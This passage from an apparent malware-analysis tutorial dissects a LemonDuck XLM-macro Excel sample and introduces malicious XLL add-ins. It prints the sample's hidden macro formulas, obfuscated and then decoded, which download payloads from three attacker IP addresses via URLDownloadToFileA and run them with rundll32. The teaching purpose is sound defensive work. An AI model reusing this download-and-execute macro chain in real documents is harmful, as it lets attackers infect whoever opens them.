- **Zipdump**: `c:\Tools\MalDoc\Office\Tools\DidierStevensSuite\zipdump.py`
- **AMSIScriptContentRetrieval**: `C:\Tools\AMSIScript\AMSIScriptContentRetrieval.ps1`
- **XLMDeobfuscator**: `XLMDeobfuscator` is added in environmental variables. In command prompt, simply type `XLMDeobfuscator` and provide file path with `--file` parameter.
- **LemonDuck Sample**: `C:\Tools\MalDoc\Office\Demo\Samples\Excel\LemonDuck\Document_1997713103_03232021_Copy.xlsm`

* * *

**Warning:** This malicious sample should be executed only in the isolated target (VM); avoid running them on any personal or unsecured systems to prevent accidental infection.

We'll start with getting some basic information about the file we are dealing with using `trid`:

```cmd-session
C:\> trid C:\Tools\MalDoc\Office\Demo\Samples\Excel\LemonDuck\Document_1997713103_03232021_Copy.xlsm

```

![Excel-XLM](JZ9Jv6ZOP0GH.png)

The basic information shows us that it also contains a zip format. We'll try to unzip it and view it in the next section, where we'll perform the manual analysis without using tools. Next, we'll check some more information related to this file using `OleId`, which shows that there are XLM macros present in this file.

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\oletools\oleid.py C:\Tools\MalDoc\Office\Demo\Samples\Excel\LemonDuck\Document_1997713103_03232021_Copy.xlsm

XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel)
oleid 0.60.1 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: C:\Tools\MalDoc\Office\Demo\Samples\Excel\LemonDuck\Document_1997713103_03232021_Copy.xlsm
--------------------+--------------------+----------+--------------------------
Indicator           |Value               |Risk      |Description
--------------------+--------------------+----------+--------------------------
File format         |MS Excel 2007+      |info      |
                    |Macro-Enabled       |          |
                    |Workbook (.xlsm)    |          |
--------------------+--------------------+----------+--------------------------
Container format    |OpenXML             |info      |Container type
--------------------+--------------------+----------+--------------------------
Encrypted           |False               |none      |The file is not encrypted
--------------------+--------------------+----------+--------------------------
VBA Macros          |No                  |none      |This file does not contain
                    |                    |          |VBA macros.
--------------------+--------------------+----------+--------------------------
XLM Macros          |Yes                 |Medium    |This file contains XLM
                    |                    |          |macros. Use olevba to
                    |                    |          |analyse them.
--------------------+--------------------+----------+--------------------------
External            |0                   |none      |External relationships
Relationships       |                    |          |such as remote templates,
                    |                    |          |remote OLE objects, etc
--------------------+--------------------+----------+--------------------------

```

OleId suggests that this file contains XLM macros. We'll use olevba to analyze them. Olevba shows the details of the raw EXCEL4/XLM macro formulas. It also shows the deobfuscated EXCEL4/XLM macro formulas at the bottom.

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\oletools\olevba.py C:\Tools\MalDoc\Office\Demo\Samples\Excel\LemonDuck\Document_1997713103_03232021_Copy.xlsm

```

![Excel-XLM](T4QftgvWX96s.png)

The screenshot presented illustrates the deobfuscated EXCEL4/XLM macro formulas as they appear within the spreadsheet.

![Excel-XLM](Xiue4tvnt1tQ.png)

These are the IOCs found by `olevba`.

![Excel-XLM](GLKICdK9yISP.png)

We can see the suspicious URLs that host the malicious files. We'll now understand how these tools are obtaining this information.

## The manual way

Zipdump gives us a glimpse of what's inside the Excel file.

```cmd-session
C:\> python C:\Tools\MalDoc\Office\Tools\DidierStevensSuite\zipdump.py C:\Tools\MalDoc\Office\Demo\Samples\Excel\LemonDuck\Document_1997713103_03232021_Copy.xlsm

Index Filename                                Encrypted Timestamp
    1 [Content_Types].xml                             0 1980-01-01 00:00:00
    2 _rels/.rels                                     0 1980-01-01 00:00:00
    3 xl/workbook.xml                                 0 1980-01-01 00:00:00
    4 xl/_rels/workbook.xml.rels                      0 1980-01-01 00:00:00
    5 xl/worksheets/sheet1.xml                        0 1980-01-01 00:00:00
    6 xl/macrosheets/sheet1.xml                       0 1980-01-01 00:00:00
    7 xl/macrosheets/sheet2.xml                       0 1980-01-01 00:00:00
    8 xl/theme/theme1.xml                             0 1980-01-01 00:00:00
    9 xl/styles.xml                                   0 1980-01-01 00:00:00
   10 xl/sharedStrings.xml                            0 1980-01-01 00:00:00
   11 xl/drawings/drawing1.xml                        0 1980-01-01 00:00:00
   12 xl/media/image1.gif                             0 1980-01-01 00:00:00
   13 xl/drawings/drawing2.xml                        0 1980-01-01 00:00:00
   14 xl/drawings/drawing3.xml                        0 1980-01-01 00:00:00
   15 xl/worksheets/_rels/sheet1.xml.rels             0 1980-01-01 00:00:00
   16 xl/macrosheets/_rels/sheet1.xml.rels            0 1980-01-01 00:00:00
   17 xl/macrosheets/_rels/sheet2.xml.rels            0 1980-01-01 00:00:00
   18 xl/drawings/_rels/drawing1.xml.rels             0 1980-01-01 00:00:00
   19 xl/drawings/_rels/drawing2.xml.rels             0 1980-01-01 00:00:00
   20 xl/drawings/_rels/drawing3.xml.rels             0 1980-01-01 00:00:00
   21 xl/printerSettings/printerSettings1.bin         0 1980-01-01 00:00:00
   22 xl/printerSettings/printerSettings2.bin         0 1980-01-01 00:00:00
   23 docProps/core.xml                               0 1980-01-01 00:00:00
   24 docProps/app.xml

```

We start our manual analysis by extracting the Excel file with the 7zip utility. The output below shows the contents of the sample Excel file.

![Excel-XLM](Cn0BFM1CwdPX.png)

There is one directory named " `xl`". The image below shows the contents in the " `xl`" directory.

![Excel-XLM](4iMQAz6ZI3Ib.png)

### Introduction of contents

The `workbook.xml` holds the basic information related to the Excel project. This is handy when analyzing malicious Excel files, where attackers hide sheets in the project containing malicious macros. Reading this document will help us gather more information regarding the number of sheets present in the project and the state of each of them.

![Excel-XLM](b825HBzX81o5.png)

`sharedStrings.xml` is another very important file we need to check to uncover all strings used in the project. The Excel project uses indices in this document to reference the strings.

![Excel-XLM](xYFRPKVswoDK.png)

Finally, the directory `macrosheets` contains our malicious macros.

![Excel-XLM](GYIVWWYEFKwf.png)

### Analyzing sharedStrings.xml

Let's start our analysis by converting the information stored in `sharedStrings.xml` into an easy-to-read table. Each item within `<si>` and `</si>` is a string which is used in the Excel project. The first item's index position is 0, and so on.

The code shown below is the content available in `shareStrings.xml`:

```xml
  <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
  <sst
  	xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="28" uniqueCount="22">
  	<si>
  		<t>R</t>
  	</si>
  	<si>
  		<t>L</t>
  	</si>

...SNIP...

  	<si>
  		<t>HERTY</t>
  	</si>
  	<si>
  		<t>A</t>
  	</si>
  	<si>
  		<t>http://</t>
  	</si>
  	<si>
  		<t>188.127.227.99/</t>
  	</si>
  	<si>
  		<t>45.150.67.29/</t>
  	</si>
  </sst>

```

We can see two interesting IP addresses: `188.127.227.99` and `45.150.67.29`.

Let's map the index position to its value in a table as shown below. When we analyze macros, we will use this table to deobfuscate the strings.

| Index Number | Value |
| --- | --- |
| 0 | R |
| 1 | L |
| 2 | M |
| 3 | o |
| 4 | n |
| 5 | D |
| 6 | w |
| 7 | l |
| 8 | a |
| 9 | d |
| 10 | T |
| 11 | F |
| 12 | i |
| 13 | e |
| 14 | J |
| 15 | C |
| 16 | B |
| 17 | HERTY |
| 18 | A |
| 19 | http:// |
| 20 | 188.127.227.99/ |
| 21 | 45.150.67.29/ |

### Analyzing workbook.xml

Before we dive into macros, we need to learn about the sheets and their states. The `workbook.xml` present in the malicious Excel file is shown below.

```xml
...SNIP...
  		<sheets>
  			<sheet name="sheet" sheetId="1" r:id="rId1"/>
  			<sheet name="sheet1" sheetId="2" r:id="rId2"/>
  			<sheet name="sheet2" sheetId="8" r:id="rId3"/>
  		</sheets>
  		<definedNames>
  			<definedName name="_xlnm.Auto_Open">sheet1!$AO$168</definedName>
  		</definedNames>
  		<calcPr calcId="162913"/>
  	</workbook>

```

Pay close attention to the `<sheets>` and the `</sheets>` XML tags; this is where we will find about all the sheets present in the project and its state. In this project there are only 3 sheets - `sheet`, `sheet1`, and `sheet2`. We don't see any mention of the state attribute in the `<sheet>` tag. If an adversary wishes to hide a sheet, the state attribute will be set to 'hidden' in the `<sheet>` tag. In our case, the sheets are visible to the user.

```xml
...SNIP...
  		<sheets>
  			<sheet name="sheet" sheetId="1" r:id="rId1"/>
  			<sheet name="sheet1" sheetId="2" r:id="rId2"/>
  			<sheet name="sheet2" sheetId="8" r:id="rId3"/>
  		</sheets>
...SNIP...

```

There is an interesting tag `<definedName>` tag present in the document; its name attribute points to `_xlnm.Auto_Open`, and its value is set to `sheet1!$AO$168`. This a key piece of information, this similar to the VBA `auto_open` function. When the user opens this Excel workbook, the macro execution starts from the `$AO$168` cell inside `sheet1`.

```xml
...SNIP...
  		<definedNames>
  			<definedName name="_xlnm.Auto_Open">sheet1!$AO$168</definedName>
  		</definedNames>
...SNIP...

```

We will now proceed to analyze the sheets.

### Analyzing sheet1.xml

The `sheet1.xml` in the `macrosheets` directory is shown below:

```xml
...SNIP...
  	<sheetData>
  		<row r="1" spans="1:1" x14ac:dyDescent="0.3">
  			<c r="A1" s="4"/>
  		</row>
...SNIP...
  		<row r="262" spans="41:41" x14ac:dyDescent="0.3">
  			<c r="AO262" s="2" t="str">
  				<f>NOW()&amp;".dat"</f>
  				<v>44273,4828008102.dat</v>
  			</c>
  		</row>
  		<row r="265" spans="41:41" x14ac:dyDescent="0.3">
  			<c r="AO265" s="2" t="b">
  				<f>NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=FORMULA.FILL(","&amp;AL101&amp;AL113&amp;AL113&amp;AL99&amp;AL114&amp;"g"&amp;"i"&amp;"s"&amp;"t"&amp;"e"&amp;"r"&amp;"S"&amp;"e"&amp;"r"&amp;"v"&amp;"e"&amp;"r",AP265)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>
  				<v>0</v>
  			</c>
  		</row>
  		<row r="271" spans="41:41" x14ac:dyDescent="0.3">
  			<c r="AO271" s="2" t="b">
  				<f>NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=""&amp;""&amp;REGISTER("U"&amp;AL99&amp;AL100&amp;AK117&amp;AL110&amp;AL104,"U"&amp;AL99&amp;AL100&amp;AL101&amp;AL102&amp;AL103&amp;AL104&amp;AL105&amp;AL106&amp;AL107&amp;AL108&amp;AL109&amp;AL110&amp;AL111&amp;AL112&amp;AL113&amp;AL114&amp;AL115,AK105&amp;AK106&amp;AK107&amp;AK108&amp;AK109&amp;AK110,AK112,,1,9)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>
  				<v>0</v>
  			</c>
  		</row>
  		<row r="272" spans="41:41" x14ac:dyDescent="0.3">
  			<c r="AO272" s="2" t="e">
  				<f>NOW()=NOW()=NOW()=HERTY(0,AH87&amp;Z400&amp;AO262,"..\Fol.doka",0,0)</f>
  				<v>#NAME?</v>
  			</c>
  		</row>
  		<row r="273" spans="41:47" x14ac:dyDescent="0.3">
  			<c r="AO273" s="2" t="e">
  				<f>NOW()=NOW()=NOW()=HERTY(0,AH87&amp;Z401&amp;AO262,"..\Fol.doka1",0,0)</f>
  				<v>#NAME?</v>
  			</c>
  		</row>
  		<row r="274" spans="41:47" x14ac:dyDescent="0.3">
  			<c r="AO274" s="2" t="e">
  				<f>NOW()=NOW()=NOW()=HERTY(0,AH87&amp;Z402&amp;AO262,"..\Fol.doka2",0,0)</f>
  				<v>#NAME?</v>
  			</c>
  		</row>
  		<row r="277" spans="41:47" x14ac:dyDescent="0.3">
  			<c r="AO277" s="2" t="e">
  				<f>GOTO(sheet2!X191)</f>
  				<v>#N/A</v>
  			</c>
  		</row>
  		<row r="281" spans="41:47" x14ac:dyDescent="0.3">
  			<c r="AU281" s="2" t="b">
  				<f>RETURN()</f>
  				<v>0</v>
  			</c>
  		</row>
  		<row r="400" spans="26:26" x14ac:dyDescent="0.3">
  			<c r="Z400" s="2" t="s">
  				<v>20</v>
  			</c>
  		</row>
  		<row r="401" spans="26:26" x14ac:dyDescent="0.3">
  			<c r="Z401" s="2" t="s">
  				<v>21</v>
  			</c>
  		</row>
  		<row r="402" spans="26:26" x14ac:dyDescent="0.3">
  			<c r="Z402" s="2" t="str">
  				<f>"195.123.213.126/"</f>
  				<v>195.123.213.126/</v>
  			</c>
  		</row>
  	</sheetData>
  	<pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  	<pageSetup paperSize="9" orientation="portrait" r:id="rId1"/>
  	<drawing r:id="rId2"/>
  </xm:macrosheet>

```

Let's look for any interesting formulas present (items enclosed within `<f>` and `</f>`) in `sheet1.xml`.

For example, here is an obfuscated formula:

```xml
...SNIP...
  <f>
  NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=FORMULA.FILL(","&amp;AL101&amp;AL113&amp;AL113&amp;AL99&amp;AL114&amp;"g"&amp;"i"&amp;"s"&amp;"t"&amp;"e"&amp;"r"&amp;"S"&amp;"e"&amp;"r"&amp;"v"&amp;"e"&amp;"r",AP265)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()
  </f>
...SNIP...

```

We'll start deobfuscating such formulas present in the sheet. To do that, we need to replace each cell reference like `AL101`, `AL113`, etc., with actual value present in that cell. The `&amp` is the `&` symbol, which will concatenate each string.

Search for the string `AL101` in `sheet1.xml`, and you will find a row definition as shown below:

```xml
...SNIP...
  <row r="101" spans="37:38" x14ac:dyDescent="0.3">
  			<c r="AL101" s="2" t="s">
  				<v>5</v>
  			</c>
  </row>
...SNIP...

```

Here we can see the cell AL101 defined within `<c>` and `</c>`. The value for this cell is enclosed within `<v>` and `</v>`. The value stored in AL101 in our case is 5. Repeat this process for all the cell references in the formula.

```xlm
&amp;
AL101&amp;
AL113&amp;
AL113&amp;
AL99&amp;
AL114&amp;
"g"&amp;
"i"&amp;
"s"&amp;
"t"&amp;
"e"&amp;
"r"&amp;
"S"&amp;
"e"&amp;
"r"&amp;
"v"&amp;
"e"&amp;
"r",AP265)

```

The values for these cells are added in the table below:

| CELL Reference | Cell Value (SharedString Index) |
| --- | --- |
| AL101 | 5 |
| AL113 | 7 |
| AL113 | 7 |
| AL99 | 0 |
| AL114 | 13 |

Now we need to correlate this information with the information from the previous table (SharedString) we created earlier. For example, at index 5, we have the value 'D' in the SharedString table.

The information needed to deobfuscate the strings is shown in the table below:

| CELL Reference | Cell Value (SharedString Index) | SharedString Index Value |
| --- | --- | --- |
| AL101 | 5 | D |
| AL113 | 7 | L |
| AL113 | 7 | L |
| AL99 | 0 | R |
| AL114 | 13 | e |

The deobfuscated formula is shown below. The `FORMULA.FILL` will simply fill the cell `AP265` with value " ,DLLRegisterServer", when Excel opens reads this file. Note that the `NOW()` function returns current date and time.

```xml
...SNIP...
  <f>
  NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=FORMULA.FILL(",DLLRegisterServer",AP265)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()
  </f>
...SNIP...

```

Similarly, let's look at the next obfuscated formula shown below:

```xml
...SNIP...

<f>NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=""&amp;""&amp;REGISTER("U"&amp;AL99&amp;AL100&amp;AK117&amp;AL110&amp;AL104,"U"&amp;AL99&amp;AL100&amp;AL101&amp;AL102&amp;AL103&amp;AL104&amp;AL105&amp;AL106&amp;AL107&amp;AL108&amp;AL109&amp;AL110&amp;AL111&amp;AL112&amp;AL113&amp;AL114&amp;AL115,AK105&amp;AK106&amp;AK107&amp;AK108&amp;AK109&amp;AK110,AK112,,1,9)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>

...SNIP...

```

Using the table below we can now easily deobfuscate the strings used in the formula.

| Cell Reference | Cell Value (SharedString Index) | SharedString Index Value |
| --- | --- | --- |
| AL99 | 0 | R |
| AL100 | 1 | L |
| AK117 | 2 | M |
| AL110 | 3 | o |
| AL104 | 4 | n |
| AL99 | 0 | R |
| AL100 | 1 | L |
| AL101 | 5 | D |
| AL102 | 3 | o |
| AL103 | 6 | w |
| AL104 | 4 | n |
| AL105 | 7 | l |
| AL106 | 3 | o |
| AL107 | 8 | a |
| AL108 | 9 | d |
| AL109 | 10 | T |
| AL110 | 3 | o |
| AL111 | 11 | F |
| AL112 | 12 | i |
| AL113 | 7 | l |
| AL114 | 13 | e |
| AL115 | 18 | A |
| AK105 | 14 | J |
| AK106 | 14 | J |
| AK107 | 15 | C |
| AK108 | 15 | C |
| AK109 | 16 | B |
| AK110 | 16 | B |
| AK112 | 17 | HERTY |

The deobfuscated formula is shown below:

```xml
  <f>
  NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=""&amp;""&amp;REGISTER("URLMon,"URLDownloadToFileA",JJCCBB,HERTY,,1,9)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()
  </f>

```

Here, the **REGISTER** function is a special function to call methods defined in a module with an alias.

![Excel-XLM](1OUcRLBgPga6.png)

The syntax for the REGISTER function is as follows:

```code
REGISTER(
    module_name,
    procedure_name,
    type,
    alias,
    argument,
    macro_type,
    category
)

```

Let's break down the parameters in detail:

- **Module\_name** is the name of the DLL, for example “Kernel32” for c:\\windows\\system32\\kernel32.dll.
- **Procedure\_name** is the name of the exported function in the DLL, for example “VirtualAlloc“.
- **Type** is a string specifying the types of return value and arguments of the functions. More on this below.
- **Alias** is a custom name that you can give to the function, by which you can call it later.
- **Argument** can be used to name the arguments to the function, but is optional (and left blank in our code).
- **Macro\_type** should be 1, which stands for function.
- **Category** is a category number (used in ancient Excel functionality). We can specify an arbitrary category number between 1 and 14 for our purpose

Here the attacker is calling a function `URLDownloadToFileA` from `URLMon.dll`. The alias used for it is `HERTY`, meaning we can call URLDownloadToFileA API by calling `HERTY(...)`.

In our case the third argument passed to the REGISTER function is " `JJCCB`", according to the [official documentation](https://support.microsoft.com/en-us/office/using-the-call-and-register-functions-06fa83c1-2869-4a89-b665-7e63d188307f?ui=en-us&rs=en-us&ad=us#__toc309221621) of Microsoft, this is a return data type followed by the types of arguments passed to the procedure we are calling.

- `J` \- Signed 4-byte integer
- `C` \- Null-terminated string (maximum string length = 255)
- `B` \- IEEE 8-byte floating-point number

Let's work on the final set of formulas in the sheet1 shown below.

```xml
  <f>NOW()=NOW()=NOW()=HERTY(0,AH87&amp;Z400&amp;AO262,"..\Fol.doka",0,0)</f>
  <f>NOW()=NOW()=NOW()=HERTY(0,AH87&amp;Z401&amp;AO262,"..\Fol.doka1",0,0)</f>
  <f>NOW()=NOW()=NOW()=HERTY(0,AH87&amp;Z402&amp;AO262,"..\Fol.doka2",0,0)</f>

```

Let's use the table below to deobfuscate the values in the formulas shown above.

| Cell Reference | Cell Value (SharedString Index) | SharedString Index Value |
| --- | --- | --- |
| AH87 | 19 | http:// |
| Z400 | 20 | 188.127.227.99/ |
| Z401 | 21 | 45.150.67.29/ |

As discussed below, the HERTY string is an alias for the `URLDownloadToFileA` API, so we can quickly replace this string with `URLMon.URLDownloadToFileA`

```xml
<f>NOW()=NOW()=NOW()=URLMon.URLDownloadToFileA(0,http://188.127.227.99/44273,4828008102.dat,"..\Fol.doka",0,0)</f>
    <f>NOW()=NOW()=NOW()=URLMon.URLDownloadToFileA(0,http://45.150.67.29/44273,4828008102.dat,"..\Fol.doka1",0,0)</f>
    <f>NOW()=NOW()=NOW()=URLMon.URLDownloadToFileA(0,http://195.123.213.126/44273,4828008102.dat,"..\Fol.doka2",0,0)</f>

```

The Excel file downloads `44273,4828008102.dat` from `188.127.227.99` and saves it on disk as `Fol.doka`. Three files are downloaded `Fol.doka`, `Fol.doka1` and `Fol.doka2`.

There is a `GOTO` used in sheet1, as shown below. We can assume that after performing the above operation, the control is transferred to the macros defined in sheet2.

```xml
  <row r="277" spans="41:47" x14ac:dyDescent="0.3">
  			<c r="AO277" s="2" t="e">
  				<f>GOTO(sheet2!X191)</f>
  				<v>#N/A</v>
  			</c>
  </row>

```

We will now proceed to analyze the macros sheet `sheet2.xml`.

### Analyzing sheet2.xml

The `sheet2.xml` in the macrosheets directory is shown below:

```xml
...SNIP...
  	<sheetData>
  		<row r="211" spans="24:24" x14ac:dyDescent="0.3">
  			<c r="X211" s="2" t="b">
  				<f>NOW()=NOW()=NOW()=FORMULA.FILL(sheet1!AL99&amp;"u"&amp;"n"&amp;"d"&amp;"l"&amp;"l"&amp;"3"&amp;"2 ",Y211)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>
  				<v>0</v>
  			</c>
  		</row>
  		<row r="213" spans="24:24" x14ac:dyDescent="0.3">
  			<c r="X213" s="2" t="b">
  				<f>NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=EXEC(sheet2!Y211&amp;"..\Fol.doka"&amp;sheet1!AP265)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>
  				<v>0</v>
  			</c>
  		</row>
  		<row r="214" spans="24:24" x14ac:dyDescent="0.3">
  			<c r="X214" s="2" t="b">
  				<f>NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=EXEC(sheet2!Y211&amp;"..\Fol.doka1"&amp;sheet1!AP265)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>
  				<v>0</v>
  			</c>
  		</row>
  		<row r="215" spans="24:24" x14ac:dyDescent="0.3">
  			<c r="X215" s="2" t="b">
  				<f>NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=EXEC(sheet2!Y211&amp;"..\Fol.doka2"&amp;sheet1!AP265)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>
  				<v>0</v>
  			</c>
  		</row>
  		<row r="220" spans="24:24" x14ac:dyDescent="0.3">
  			<c r="X220" s="2" t="b">
  				<f>GOTO(sheet1!AU279)</f>
  				<v>0</v>
  			</c>
  		</row>
  	</sheetData>
...SNIP...
  </xm:macrosheet>

```

This is a small document; the actual execution of the malware payload code takes place in this sheet. The payload downloaded by sheet1 is executed here in sheet2 using the very dangerous `=EXEC()` routine.

There is a `=FORMULA.FILL()` routine used, as shown below. This fills the cell `Y211` with some value.

```xml
  <f>
  NOW()=NOW()=NOW()=FORMULA.FILL(sheet1!AL99&amp;"u"&amp;"n"&amp;"d"&amp;"l"&amp;"l"&amp;"3"&amp;"2 ",Y211)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()
  </f>

```

With the table below, we can easily find out the value of `AL99`.

| Cell Reference | Cell Value (SharedString Index) | SharedString Index Value |
| --- | --- | --- |
| AL99 | 0 | R |

When the user opens the document, the cell `Y211` gets filled with the string " `Rundll32`". The deobfuscated formula is shown below:

```xml
  <f> NOW()=NOW()=NOW()=FORMULA.FILL("Rundll32",Y211)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()
  </f>

```

Next, we can see below formulas use `=EXEC()` function. The `sheet2!Y211` and `sheet1!AP265` are filled with "Rundll32" and " `  ,DLLRegisterServer`" respectively. We've already discussed it in prior sections.

```xml
  <f>NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=EXEC(sheet2!Y211&amp;"..\Fol.doka"&amp;sheet1!AP265)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>
  <f>NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=EXEC(sheet2!Y211&amp;"..\Fol.doka1"&amp;sheet1!AP265)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>
  <f>NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=EXEC(sheet2!Y211&amp;"..\Fol.doka2"&amp;sheet1!AP265)=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>

```

By replacing the cell references with the above-mentioned values, we can clearly see the intention behind these formulas. The Excel document executes an exported function `DLLRegisterServer` in doka module. This is how LemmonDuck malware is deployed on the system.

```xml
  <f>NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=EXEC(""RunDll32 ..\Fol.doka ,DLLRegisterServer"")=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>
  <f>NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=EXEC(""RunDll32 ..\Fol.doka1 ,DLLRegisterServer"")=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>
  <f>NOW()=NOW()=NOW()=NOW()=NOW()=NOW()=EXEC(""RunDll32 ..\Fol.doka2 ,DLLRegisterServer"")=NOW()=NOW()=NOW()=NOW()=NOW()=NOW()</f>

```

There is a GOTO in the sheet2, as shown below, which points to the AU279 cell in sheet1. There is a `RETURN()` function in the cell `AU281`. So the control goes back to sheet1 and executes the `RETURN()` function.

```xml
sheet2
<row r="220" spans="24:24" x14ac:dyDescent="0.3">
			<c r="X220" s="2" t="b">
				<f>GOTO(sheet1!AU279)</f>
				<v>0</v>
			</c>
</row>

sheet1
<row r="281" spans="41:47" x14ac:dyDescent="0.3">
			<c r="AU281" s="2" t="b">
				<f>RETURN()</f>
				<v>0</v>
			</c>
</row>

```

### Automating the XLM Deobfuscation

The tool [XLMMacroDeobfuscator](https://github.com/DissectMalware/XLMMacroDeobfuscator) can automate the manual process of XLM deobfuscation shown in the prior section. This tool emulates macro code execution to produce deobfuscated macro code.

The snippet below shows the use of `XLMMacroDeobfuscator` to extract the deobfuscated macro code directly:

```cmd-session
C:\> xlmdeobfuscator --file "C:\Tools\MalDoc\Office\Demo\Samples\Excel\LemonDuck\Document_1997713103_03232021_Copy.xlsm"

```

![Excel-XLM](zFvQMRZcwQ3T.png)

When the user opens the document, macro in the sheet1 is invoked. This will download three payloads - `doka`, `doka1`, and `doka2` from 188.127.227.99, 45.150.67.29 and 195.123.213.126, respectively, by invoking `URLDownloadToFileA` from `urlmon.dll`.

Then the macro in the sheet2 is executed. The macro in the sheet2 simply uses the `=EXEC()` function to run `rundll32`. The `rundll32` is used to invoke the function `DllRegisterServer` exported by `doka`, `doka1`, and `doka2`.


# Analysis of XLL Add-ins

## Introduction to XLL

XLL (Excel Linked Library) add-ins are dynamic link libraries (DLLs) specifically designed to extend the functionality of Microsoft Excel. These add-ins allow developers to create custom functions, automate tasks, and integrate external tools with Excel. XLL files are compiled binaries that Excel can load at runtime, enabling high-performance operations that might be too complex or slow to implement with VBA (Visual Basic for Applications) or standard Excel functions.

In this section, we are focused on examining `.xll` add-ins; however, there are other add-ins as well, such as `.wll` (Word add-ins). The analysis process should be similar for these add-ins. Both `.xll` and `.wll` files can act as DLLs and are loaded directly by their respective Microsoft Office applications, making them potential vectors for malware. While XLL add-ins are powerful tools for legitimate purposes, they are weaponized by adversaries in real-world malware samples. This is covered under [T1137.006](https://attack.mitre.org/techniques/T1137/006/) ( `Office Application Startup: Add-ins`) in the MITRE ATT&CK framework.

![xll](n6Zf8rEiWIMT.png)

## Malicious Use of XLL

- `Execution of Malicious Code`: Since XLLs are DLLs, they can execute arbitrary code when loaded by Excel. Attackers can create XLLs that execute malicious payloads, such as dropping additional malware, exfiltrating data, or providing a backdoor into the system.
- `Persistence Mechanism`: Once an XLL is loaded, it can remain persistent across Excel sessions. This persistence can be leveraged by attackers to maintain a foothold on a compromised machine.
- `Evasion Techniques`: Unlike macros or VBA scripts, which are more commonly scrutinized by security tools, XLLs might not be as heavily monitored, making them an attractive option for attackers seeking to evade detection.

## Malicious XLL Sample

We'll perform the analysis of a malicious XLL sample. The details are as follows:

| Name | Description |
| --- | --- |
| File Name | ACW-701-M-074 071.xls |
| MD5 Hash | 7E98647AACA6912115E922AD97D1F4E6 |
| VirusTotal | [details](https://www.virustotal.com/gui/file/c314c7feeb98de6391da83678e1639aade3fbe9c95846b8c2f2590ea3d34dd4f/details) |

This sample XLL file is renamed to `.xls` by the threat actor. This is done because if Excel is installed on a system, this file will automatically open in Excel.

![xll](jD1WEb8aKByW.png)

Suppose that MS Excel is installed on a system, and the user double-clicks on this file. A pop-up is shown, asking the user to enable the add-in.

![xll](jO7QQucO5jVl.png)

If we open this file in a PE reversing tool like [PE-Bear](https://github.com/hasherezade/pe-bear), we can see the ASCII string 'MZ' (hexadecimal: 4D 5A), which is used to identify a PE (Portable Executable). The file characteristics show that it is a DLL file. An XLL file is essentially a DLL file with an exported function named `xlAutoOpen`, which will be executed automatically when it is opened in Excel.

![xll](HNJjkbkHAKP6.png)

If we check the strings, there is nothing interesting apart from the `xlAutoOpen` function name.

![xll](0JwcnPROTZE7.png)

We can see the presence of the exported function `xlAutoOpen` in the Export Directory (Exports) of this DLL file, as shown in the screenshot below.

![xll](B235r1k3ZyAh.png)

We need to understand what this function does. To do that, we'll open it in a debugger.

First, we'll rename this XLL file to `.dll` file, and then we'll call the `xlAutoOpen` exported function. There's a way to call a function from a DLL directly using `rundll32.exe`, as shown in the LOLBAS [documentation](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) of `rundll32.exe`.

Let's summarize the steps which we are going to perform:

- **Step 1** \- Rename the file to DLL.
- **Step 2** \- Execute the DLL's `xlAutoOpen` exported function using rundll32 and debugger.
- **Step 3** \- Figure out anti-debug checks, encryption, shellcode date etc.
- **Step 4** \- Extract the IOCs

## XLL Analysis in Debugger

